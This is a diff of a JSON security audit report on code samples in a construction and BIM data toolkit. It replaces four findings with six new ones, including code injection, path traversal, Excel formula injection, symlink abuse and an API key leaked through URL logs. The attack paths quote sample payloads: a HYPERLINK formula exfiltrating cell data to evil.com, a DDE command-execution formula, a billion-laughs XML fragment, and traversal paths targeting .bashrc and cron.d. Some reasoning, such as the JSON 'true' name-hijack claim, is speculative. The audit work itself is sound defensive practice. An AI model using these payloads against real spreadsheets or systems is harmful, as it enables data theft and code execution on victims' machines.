@@ -1,86 +1,141 @@
 [
   {
+    "id": "VULN-001",
     "severity": "high",
-    "location": "2_DDC_Book/2.1-Data-Types-Classification/csv-handler/SKILL.md",
-    "title": "Path traversal via unsanitized CSV column values used in file path construction in split_csv.",
-    "description": "The split_csv method constructs output filenames by interpolating raw DataFrame column values into an f-string filename (f\"{group_column}_{value}.csv\"), then joins it with the output directory using pathlib's / operator. Column values originate from attacker-controlled CSV file content and are never sanitized for path-separator or directory-traversal characters. Pathlib does not prevent traversal sequences in the operand, so a value containing '../' resolves to a path outside the intended output directory.",
-    "impact": "An attacker who supplies a malicious CSV file can write arbitrary files to any location writable by the process. This can overwrite configuration files, inject cron jobs, replace scripts, or plant web shells depending on the process's filesystem permissions.",
+    "location": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md",
+    "title": "Code injection via generation of executable Dynamo script from untrusted Excel data",
+    "description": "The generate_dynamo_script() method reads arbitrary user data from an Excel spreadsheet (via prepare_updates()), serializes it with json.dumps(), and embeds the output directly into a Python script that is written to disk and intended to be executed inside Revit Dynamo with full Revit API privileges. While json.dumps() escapes string content, it produces JSON booleans (true/false) and nulls (null) which are not valid Python identifiers — causing NameError at runtime and opening the door for a name-hijack attack. An attacker who controls the Excel input can define boolean-typed parameter mappings whose values serialize to the bare name 'true', 'false', or 'null', and then arrange for those names to be bound to malicious callables or objects in the Dynamo IronPython environment. Furthermore, json.dumps outputs are valid Python only by coincidence; any future refactor replacing json.dumps with manual string formatting (e.g., repr(), f-strings) would immediately enable full Python code injection via crafted Excel cell values. The generated script runs TransactionManager operations that can modify the entire Revit model.",
+    "impact": "An attacker who supplies a malicious Excel file can cause the generated Dynamo script to execute arbitrary code inside the Revit environment, potentially modifying the BIM model, exfiltrating project data, or achieving code execution on the workstation running Dynamo.",
     "attack_path": [
-      "1. Attacker crafts a CSV file where the group column contains a value such as '../../../tmp/evil' or '../../.bashrc'.",
-      "2. A user or automated pipeline calls handler.split_csv(df, group_column='category', output_dir='./split_files').",
-      "3. The method iterates df['category'].unique(), reaching the malicious value.",
-      "4. filename becomes 'category_../../tmp/evil.csv'.",
-      "5. filepath = Path('./split_files') / 'category_../../tmp/evil.csv' resolves to a path outside ./split_files/.",
-      "6. subset.to_csv(filepath, index=False) writes attacker-controlled data to the traversed path."
+      "1. Attacker crafts an Excel file with malicious values in mapped columns (e.g., element names containing Python-interpretable sequences, boolean columns that serialize to bare 'true'/'false' identifiers)",
+      "2. Victim loads the Excel file using ExcelToBIMUpdater.load_excel() and calls prepare_updates()",
+      "3. Victim calls generate_dynamo_script(updates, output_path) which embeds the attacker-controlled data into a Python script via json.dumps()",
+      "4. The generated script is saved to disk at a user-specified path (arbitrary file write)",
+      "5. Victim opens the script in Dynamo, which executes it with full Revit API and file system access",
+      "6. The json.dumps-produced 'true'/'false'/'null' tokens resolve to attacker-controlled names if the IronPython namespace has been poisoned, or the script crashes with NameError causing denial of service"
     ],
     "evidence": [
-      "2_DDC_Book/2.1-Data-Types-Classification/csv-handler/SKILL.md:171 - filename = f\"{group_column}_{value}.csv\"",
-      "2_DDC_Book/2.1-Data-Types-Classification/csv-handler/SKILL.md:172 - filepath = output_path / filename",
-      "2_DDC_Book/2.1-Data-Types-Classification/csv-handler/SKILL.md:173 - subset.to_csv(filepath, index=False)",
-      "2_DDC_Book/2.1-Data-Types-Classification/csv-handler/SKILL.md:169 - for value in df[group_column].unique():"
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 153, "detail": "generate_dynamo_script() method begins — constructs Python source from user data"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 173, "detail": "script += json.dumps(updates, indent=2) — injects JSON-serialized user data into Python source; json booleans (true/false) are not valid Python"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 206, "detail": "with open(output_path, 'w') as f: f.write(script) — writes executable Python script to arbitrary path without sanitization"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 127, "detail": "prepare_updates() reads element_id and parameter values from user-supplied DataFrame without validation"}
     ],
-    "remediation": "Sanitize the 'value' variable before using it in the filename by stripping or replacing path separators and traversal sequences. Apply os.path.basename() or replace '/', '\\', and '..' characters. After constructing the full path, verify that the resolved path (filepath.resolve()) is still within the intended output_path.resolve() before writing. Example: filepath = output_path / re.sub(r'[^a-zA-Z0-9_.-]', '_', str(value)) + '.csv'; assert filepath.resolve().is_relative_to(output_path.resolve())."
+    "remediation": "1. Use json.dumps() output as a separate JSON data file, not embedded Python source. Load it at runtime with json.load(). 2. Alternatively, use ast.literal_eval()-safe repr() for serialization, or use Python's True/False/None instead of JSON booleans. 3. Validate and sanitize all Excel input values before embedding them in generated code. 4. Restrict output_path to a known safe directory. 5. Consider using a templating engine with proper escaping for code generation."
   },
   {
+    "id": "VULN-002",
     "severity": "medium",
-    "location": "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md",
-    "title": "XML entity expansion denial-of-service (Billion Laughs) via unprotected xml.etree.ElementTree parsing.",
-    "description": "The ConstructionXMLReader class and all its subclasses (P6XMLReader, IFCXMLReader, COBieXMLReader, BSDDXMLReader) use Python's xml.etree.ElementTree.parse() and ET.fromstring() to parse XML data. Python's own documentation explicitly warns that 'The xml.etree.ElementTree module is not secure against maliciously constructed data.' These functions are vulnerable to exponential entity expansion (Billion Laughs) and quadratic blowup attacks, where a crafted XML document can expand to consume gigabytes of memory and CPU, causing denial of service.",
-    "impact": "An attacker who supplies a malicious XML file (e.g., a crafted P6 schedule export, IFC-XML, or COBie-XML file) can cause the parsing process to consume all available memory and CPU, resulting in denial of service of the application or server.",
+    "location": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md",
+    "title": "Arbitrary file write via unsanitized output_path parameters in script and report generation",
+    "description": "Multiple methods in ExcelToBIMUpdater accept an output_path parameter and write files to it without any path validation or sandboxing: generate_dynamo_script() writes executable Python code, generate_update_report() writes Excel files, and generate_ifc_updates() writes IFC files. If these functions are exposed through a web API, internal tool, or CI/CD pipeline, an attacker can supply path traversal sequences (e.g., '../../etc/cron.d/payload' or '../../../../autostart/malicious.py') to write files to arbitrary filesystem locations.",
+    "impact": "An attacker can write files to arbitrary locations on the filesystem, potentially overwriting critical files, placing executable code in autostart directories, or corrupting project data.",
     "attack_path": [
-      "1. Attacker creates an XML file with recursive entity definitions (Billion Laughs pattern): <!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;...'>...]>.",
-      "2. The file is presented as a P6 schedule export, COBie file, or IFC-XML file.",
-      "3. User or pipeline calls reader.parse_file('malicious.xml') or reader.parse_string(malicious_xml_string).",
-      "4. ET.parse() or ET.fromstring() attempts to expand entities exponentially.",
-      "5. Memory and CPU consumption grow exponentially, crashing the process or starving the system."
+      "1. Attacker provides a crafted output_path parameter containing path traversal sequences (e.g., '../../../.bashrc' or 'C:\\Windows\\System32\\malicious.dll')",
+      "2. Application calls generate_dynamo_script(updates, output_path) or generate_update_report(df, updates, output_path)",
+      "3. The function calls open(output_path, 'w') or pd.ExcelWriter(output_path) without validating the path",
+      "4. File is written to the attacker-specified location with the content controlled by the attacker (for scripts) or partially controlled (for reports)"
     ],
     "evidence": [
-      "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md:38 - def parse_file(self, file_path: str) -> ET.Element:",
-      "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md:40 - tree = ET.parse(file_path)",
-      "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md:48 - def parse_string(self, xml_string: str) -> ET.Element:",
-      "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md:50 - root = ET.fromstring(xml_string)",
-      "2_DDC_Book/2.1-Data-Types-Classification/xml-reader/SKILL.md:15 - import xml.etree.ElementTree as ET"
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 206, "detail": "open(output_path, 'w') — writes executable Python script to arbitrary user-controlled path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 255, "detail": "report_df.to_excel(output_path) — writes Excel to arbitrary path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/excel-to-bim/SKILL.md", "line_number": 237, "detail": "ifc.write(output_ifc) — writes IFC model to arbitrary path"},
+      {"file_path": "1_DDC_Toolkit/BIM-Analysis/co2-carbon-footprint/SKILL.md", "line_number": 386, "detail": "pd.ExcelWriter(output_path) — writes Excel to arbitrary path in export_results()"},
+      {"file_path": "1_DDC_Toolkit/BIM-Analysis/progress-photo-analyzer/SKILL.md", "line_number": 338, "detail": "pd.ExcelWriter(output_path) — writes Excel to arbitrary path in export_report()"}
     ],
-    "remediation": "Replace xml.etree.ElementTree with defusedxml.ElementTree (from the defusedxml package). Use defusedxml.ElementTree.parse() and defusedxml.ElementTree.fromstring() which disable entity expansion and DTD processing by default. Alternatively, use iterparse with a limited entity expansion count, or set a maximum file size check before parsing."
+    "remediation": "1. Validate output_path against an allowlist of permitted directories. 2. Use os.path.realpath() to resolve the path and verify it stays within expected boundaries. 3. Reject paths containing '..' traversal sequences. 4. Use a configurable base directory and only allow relative paths within it."
   },
   {
+    "id": "VULN-003",
     "severity": "medium",
-    "location": "2_DDC_Book/4.3-BIM-Validation-Pipeline/bim-validation-pipeline/SKILL.md",
-    "title": "XML entity expansion denial-of-service in IDS specification parser via unprotected ET.parse().",
-    "description": "The IDSValidator class in the BIM Validation Pipeline uses xml.etree.ElementTree.parse() to load IDS (Information Delivery Specification) XML files. This parser is vulnerable to the same XML entity expansion attacks (Billion Laughs, Quadratic Blowup) as the xml-reader skill. An attacker who can supply or tamper with an IDS specification file can cause denial of service through exponential memory consumption.",
-    "impact": "An attacker who controls or modifies an IDS specification XML file can crash the BIM validation pipeline or the hosting server through exponential memory consumption, disrupting the automated validation workflow.",
+    "location": "1_DDC_Toolkit/Analytics/daily-progress-report/SKILL.md",
+    "title": "Excel formula injection via unsanitized user data written to spreadsheet cells across multiple tools",
+    "description": "Multiple tools write user-controlled string data directly to Excel cells via pandas DataFrame.to_excel() and pd.ExcelWriter without sanitizing cell values. If any user-supplied field (descriptions, names, notes, locations) begins with '=', '+', '-', or '@', Excel and other spreadsheet applications will interpret the cell as a formula. This enables CSV/Formula Injection attacks where crafted values can execute system commands, make HTTP requests to exfiltrate data, or launch applications when a victim opens the generated Excel file.",
+    "impact": "An attacker who controls input data (activity descriptions, markup notes, element names, contractor names, etc.) can inject Excel formulas that execute when a project manager or stakeholder opens the generated report. This can lead to arbitrary command execution on the victim's workstation, data exfiltration via HYPERLINK formulas, or social engineering via crafted cell content.",
     "attack_path": [
-      "1. Attacker crafts a malicious IDS XML file with recursive entity definitions.",
-      "2. The file is provided as an IDS specification to the IDSValidator constructor: IDSValidator('malicious_ids.xml').",
-      "3. The _parse_ids method calls ET.parse(path) on the malicious file.",
-      "4. The XML parser attempts to expand entities exponentially.",
-      "5. The process consumes all available memory and crashes."
+      "1. Attacker provides input data containing Excel formula payloads (e.g., a work activity description set to '=HYPERLINK(\"http://evil.com/steal?\"&A1&B1,\"Click for details\")' or '=cmd|'/C calc'!A0')",
+      "2. Tool processes the data normally — no input sanitization is performed",
+      "3. Tool writes data to Excel file via pandas to_excel() which passes raw strings to openpyxl",
+      "4. Victim (project manager, client, stakeholder) opens the generated Excel report",
+      "5. Excel interprets formula-prefixed cells and executes the injected formulas",
+      "6. Attacker achieves command execution, data exfiltration, or credential theft on victim's machine"
     ],
     "evidence": [
-      "2_DDC_Book/4.3-BIM-Validation-Pipeline/bim-validation-pipeline/SKILL.md:385 - def _parse_ids(self, path):",
-      "2_DDC_Book/4.3-BIM-Validation-Pipeline/bim-validation-pipeline/SKILL.md:387 - tree = ET.parse(path)",
-      "2_DDC_Book/4.3-BIM-Validation-Pipeline/bim-validation-pipeline/SKILL.md:377 - import xml.etree.ElementTree as ET"
+      {"file_path": "1_DDC_Toolkit/Analytics/daily-progress-report/SKILL.md", "line_number": 250, "detail": "'Notes': a.notes — user-controlled notes field written directly to Excel cell without sanitization"},
+      {"file_path": "1_DDC_Toolkit/Analytics/daily-progress-report/SKILL.md", "line_number": 247, "detail": "'Description': a.description — user-controlled description written to Excel cell"},
+      {"file_path": "1_DDC_Toolkit/Document-Control/meeting-minutes-generator/SKILL.md", "line_number": 284, "detail": "'Description': a.description — action item description written to Excel without sanitization"},
+      {"file_path": "1_DDC_Toolkit/Document-Control/as-built-documentation/SKILL.md", "line_number": 211, "detail": "'Description': m.description — markup description written to Excel without sanitization"},
+      {"file_path": "1_DDC_Toolkit/Document-Control/submittal-tracker/SKILL.md", "line_number": 130, "detail": "'Title': s.title — submittal title from contractor written to Excel without sanitization"},
+      {"file_path": "1_DDC_Toolkit/BIM-Analysis/co2-carbon-footprint/SKILL.md", "line_number": 391, "detail": "'Element Name': r.element_name — BIM element name written to Excel without sanitization"},
+      {"file_path": "1_DDC_Toolkit/Analytics/productivity-analyzer/SKILL.md", "line_number": 313, "detail": "'Activity': r.activity_code — activity code written to Excel without sanitization"}
     ],
-    "remediation": "Replace xml.etree.ElementTree with defusedxml.ElementTree. Use defusedxml.ElementTree.parse() which disables entity expansion and DTD processing. Add a file size check before parsing to reject unreasonably large IDS files."
+    "remediation": "1. Sanitize all string values before writing to Excel cells: prefix any value starting with '=', '+', '-', '@', or tab/CR/LF with a single quote (') character. 2. Implement a sanitization wrapper function like: def safe_cell(val): return \"'\" + str(val) if str(val).startswith(('=','+','-','@')) else val. 3. Apply sanitization in a centralized DataFrame export utility used by all tools."
   },
   {
+    "id": "VULN-004",
     "severity": "medium",
-    "location": "2_DDC_Book/2.6-Data-Quality-Validation/data-lineage-tracker/SKILL.md",
-    "title": "Mermaid diagram injection via unsanitized entity names enables graph manipulation and potential XSS.",
-    "description": "The generate_lineage_graph method constructs Mermaid diagram syntax by interpolating entity names directly into graph node definitions using f-strings (e.g., f\"    {node_id}[{name}]\"). Entity names originate from register_entity calls which may include data from external systems (file names, table names, user-provided labels). Mermaid uses square brackets for node labels, so a name containing ']' closes the label prematurely and allows injection of arbitrary Mermaid syntax including edge definitions, additional nodes, or HTML content that some Mermaid renderers will execute.",
-    "impact": "An attacker who controls entity names (e.g., via imported data source names or table names) can manipulate the visual lineage graph to hide malicious data transformations from audit review. In web contexts where Mermaid diagrams are rendered with HTML support, injected content could lead to cross-site scripting (XSS), enabling session hijacking or data exfiltration.",
+    "location": "1_DDC_Toolkit/CAD-Converters/dwg-to-excel/SKILL.md",
+    "title": "External process execution with user-controlled file path arguments across CAD converter tools",
+    "description": "Six CAD converter tools (DWG, DGN, IFC, RVT exporters, and RVT-to-IFC converter) execute external CLI binaries via subprocess.run() with user-controlled file paths as arguments. While the tools use list-based subprocess invocation (avoiding shell injection), the external executables receive user-controlled file paths that are only validated for existence, not for content or path safety. Maliciously crafted filenames (e.g., containing special characters, very long paths, or Unicode tricks) could exploit parsing vulnerabilities in the external executables. Additionally, the file existence check uses Path.exists() which follows symlinks, allowing symlink-based attacks where a symlink points to a sensitive file that the external executable then processes.",
+    "impact": "An attacker who can control input file paths can potentially exploit vulnerabilities in the external converter executables, cause the executables to process unintended files via symlinks, or trigger unexpected behavior via crafted filenames.",
     "attack_path": [
-      "1. Attacker registers a data entity with a crafted name: tracker.register_entity(name=']-->|steal|attacker[Fake Source', source_id=src.id, entity_type='table').",
-      "2. A user calls tracker.generate_lineage_graph(entity_id) on a graph that includes the malicious entity.",
-      "3. The f-string f\"    {node_id}[{name}]\" produces a line like '    ENT_abc123[]-->|steal|attacker[Fake Source]'.",
-      "4. The Mermaid parser interprets this as a valid edge definition, altering the graph topology.",
-      "5. If rendered in a web application with HTML support in Mermaid labels, attacker-injected HTML/JavaScript executes in the user's browser."
+      "1. Attacker provides a file path that is a symlink pointing to a sensitive file (e.g., a symlink named 'project.dwg' pointing to '/etc/shadow' or a Revit model containing confidential data)",
+      "2. The convert() method checks Path.exists() which follows symlinks and returns True",
+      "3. subprocess.run([exporter, symlink_path]) passes the symlink to the external executable",
+      "4. The external executable follows the symlink and processes the target file",
+      "5. The output Excel file is written to the same directory as the input, potentially exposing sensitive data"
     ],
     "evidence": [
-      "2_DDC_Book/2.6-Data-Quality-Validation/data-lineage-tracker/SKILL.md:334 - lines.append(f\"    {node_id}[{name}]\")",
-      "2_DDC_Book/2.6-Data-Quality-Validation/data-lineage-tracker/SKILL.md:340 - lines.append(f\"    {target_node}[{name}]:::target\")",
-      "2_DDC_Book/2.6-Data-Quality-Validation/data-lineage-tracker/SKILL.md:320 - def generate_lineage_graph(self, entity_id: str) -> str:"
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/dwg-to-excel/SKILL.md", "line_number": 169, "detail": "dwg_path = Path(dwg_file) — user-controlled path used without canonicalization or symlink check"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/dwg-to-excel/SKILL.md", "line_number": 176, "detail": "subprocess.run(cmd, capture_output=True, text=True) — executes external binary with user-controlled path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/dgn-to-excel/SKILL.md", "line_number": 146, "detail": "subprocess.run(cmd, capture_output=True, text=True) — DGN converter with user-controlled path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/ifc-to-excel/SKILL.md", "line_number": 186, "detail": "subprocess.run(cmd, capture_output=True, text=True) — IFC converter with user-controlled path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/rvt-to-excel/SKILL.md", "line_number": 92, "detail": "subprocess.run(cmd, capture_output=True, text=True) — RVT converter with user-controlled path"},
+      {"file_path": "1_DDC_Toolkit/CAD-Converters/rvt-to-ifc/SKILL.md", "line_number": 150, "detail": "subprocess.run(cmd, capture_output=True, text=True) — RVT-to-IFC converter with user-controlled path"}
     ],
-    "remediation": "Sanitize entity names before interpolation into Mermaid syntax by escaping or removing Mermaid control characters (], [, |, >, -, and backticks). Use Mermaid's quoted string syntax for labels where available, or replace all non-alphanumeric characters in names with underscores. Example: safe_name = re.sub(r'[\\[\\]|>\\-`\"<]', '_', name)."
+    "remediation": "1. Resolve file paths with os.path.realpath() and validate they fall within an expected base directory. 2. Check for and reject symlinks using os.path.islink(). 3. Validate file extensions match expected types. 4. Set a maximum path length. 5. Run external executables with minimal filesystem permissions using a restricted user account or sandbox."
+  },
+  {
+    "id": "VULN-005",
+    "severity": "medium",
+    "location": "5_DDC_Innovative/weather-impact-analysis/SKILL.md",
+    "title": "API key transmitted as URL query parameter enabling credential leakage via logs and proxies",
+    "description": "The WeatherDataService._fetch_openweathermap() method transmits the OpenWeatherMap API key as a URL query parameter ('appid') in an HTTP GET request via requests.get(url, params=params). URL query parameters are routinely logged by web servers, CDN edge nodes, corporate proxy servers, SIEM systems, and browser history. This creates multiple opportunities for credential leakage. The API key could also be exposed in stack traces, error logs, or Referer headers if the response page contains links.",
+    "impact": "The API key is exposed through HTTP access logs, proxy logs, CDN logs, and potentially browser history. An attacker with access to any of these log sources can steal the API key and use it to make unauthorized API calls, potentially exhausting rate limits or incurring costs.",
+    "attack_path": [
+      "1. Application calls _fetch_openweathermap() which constructs URL with api_key as 'appid' query parameter",
+      "2. requests.get() sends HTTP GET request to https://api.openweathermap.org/data/2.5/forecast?lat=...&lon=...&appid=SECRET_KEY&units=metric",
+      "3. The full URL including the API key is logged by: corporate proxy servers, CDN access logs, web server access logs, network monitoring tools, browser history (if redirected)",
+      "4. An attacker with access to any log source extracts the API key from the URL",
+      "5. Attacker uses the stolen API key for unauthorized API access"
+    ],
+    "evidence": [
+      {"file_path": "5_DDC_Innovative/weather-impact-analysis/SKILL.md", "line_number": 192, "detail": "url = f\"https://api.openweathermap.org/data/2.5/forecast\" — base URL for API call"},
+      {"file_path": "5_DDC_Innovative/weather-impact-analysis/SKILL.md", "line_number": 196, "detail": "'appid': self.api_key — API key passed as URL query parameter, will appear in server and proxy logs"},
+      {"file_path": "5_DDC_Innovative/weather-impact-analysis/SKILL.md", "line_number": 200, "detail": "response = requests.get(url, params=params) — sends API key in URL query string"}
+    ],
+    "remediation": "1. Pass the API key in an HTTP header (e.g., 'Authorization' or 'X-API-Key') instead of as a URL query parameter. 2. Note: OpenWeatherMap's API requires 'appid' as a query parameter, so consider using a server-side proxy that adds the key, keeping it out of client-side code. 3. Rotate API keys periodically. 4. Monitor API key usage for anomalies."
+  },
+  {
+    "id": "VULN-006",
+    "severity": "medium",
+    "location": "1_DDC_Toolkit/BIM-Visualization/nobim-image-generator/SKILL.md",
+    "title": "Directory creation and file write to arbitrary filesystem paths in batch processing",
+    "description": "The NoBIMVisualizer.batch_generate() method accepts user-controlled xlsx_files paths and output_dir path. It calls Path(output_dir).mkdir(parents=True, exist_ok=True) which creates the entire directory tree for any path, then writes generated image files to that directory. The base_name for output files is derived from the input xlsx file name via Path(xlsx).stem, which is also user-controlled. Combined, an attacker can create arbitrary directories and write PNG files to any writable filesystem location. Additionally, the load_from_excel() method calls pd.read_excel(xlsx_path) on user-supplied paths without validation, enabling arbitrary file reads of Excel-formatted files.",
+    "impact": "An attacker can create arbitrary directories and write image files to any writable location on the filesystem. In combination with the arbitrary path read via pd.read_excel(), this could be used to read sensitive Excel files and exfiltrate their content via generated visualizations (element names appear in chart labels and titles).",
+    "attack_path": [
+      "1. Attacker calls batch_generate() with output_dir set to a sensitive directory (e.g., '/var/www/html/uploads/' or a web-accessible path)",
+      "2. Path(output_dir).mkdir(parents=True, exist_ok=True) creates the directory tree if it doesn't exist",
+      "3. Attacker includes a xlsx_files entry pointing to a sensitive Excel file elsewhere on the system",
+      "4. load_from_excel() reads the sensitive file's contents",
+      "5. generate_3d_scatter() and generate_category_chart() write PNG files containing data from the sensitive file to the attacker-controlled output directory",
+      "6. If the output directory is web-accessible, the attacker retrieves the generated images containing exfiltrated data"
+    ],
+    "evidence": [
+      {"file_path": "1_DDC_Toolkit/BIM-Visualization/nobim-image-generator/SKILL.md", "line_number": 171, "detail": "output_dir = Path(output_dir) — user-controlled output directory path"},
+      {"file_path": "1_DDC_Toolkit/BIM-Visualization/nobim-image-generator/SKILL.md", "line_number": 172, "detail": "output_dir.mkdir(parents=True, exist_ok=True) — creates arbitrary directory tree from user input"},
+      {"file_path": "1_DDC_Toolkit/BIM-Visualization/nobim-image-generator/SKILL.md", "line_number": 51, "detail": "self.elements = pd.read_excel(xlsx_path, sheet_name='Elements') — reads arbitrary Excel files"},
+      {"file_path": "1_DDC_Toolkit/BIM-Visualization/nobim-image-generator/SKILL.md", "line_number": 89, "detail": "plt.savefig(output_path, dpi=150, bbox_inches='tight') — writes image file to arbitrary path"}
+    ],
+    "remediation": "1. Validate output_dir resolves within an expected base directory using os.path.realpath(). 2. Reject paths containing '..' traversal sequences. 3. Validate xlsx_files paths are within permitted input directories. 4. Use a configurable sandboxed working directory for all file operations."
   }
 ]
